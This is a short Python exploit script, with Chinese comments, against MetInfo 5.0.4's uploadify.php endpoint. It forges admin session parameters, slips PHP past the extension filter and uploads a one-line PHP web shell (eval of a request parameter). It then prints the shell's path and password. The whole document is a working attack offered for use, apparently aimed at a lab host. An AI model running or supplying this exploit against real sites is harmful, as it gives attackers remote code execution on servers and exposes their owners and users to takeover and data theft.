import requests

url = "http://192.168.200.148/MetInfo5.0.4/"
vul = "admin/include/uploadify.php"

req=requests.session()
#构造请求参数
params = {
    "metinfo_admin_id":    "hecker",
    "metinfo_admin_pass":  "zz",
    "met_admin_table":     "met_admin_table#",
    "type":                "upfile",
    "met_file_format":     "jpg|pphphp"
}

# 构造上传文件
files = {
    "Filedata" : (
        'zz.php',
        b"<?php @eval($_REQUEST[777]);?>",
        "image/png"
    )
}
data = {
    "submit" : "submit"
}

# 发送请求
res=req.post(url=url+vul,params=params,files=files,data=data)

#截取返回路径拼接完整路径并与连接密码一同返回
shell_path=url+res.text[5:]
print(f"[+] Shell path: {shell_path}     Pass:777")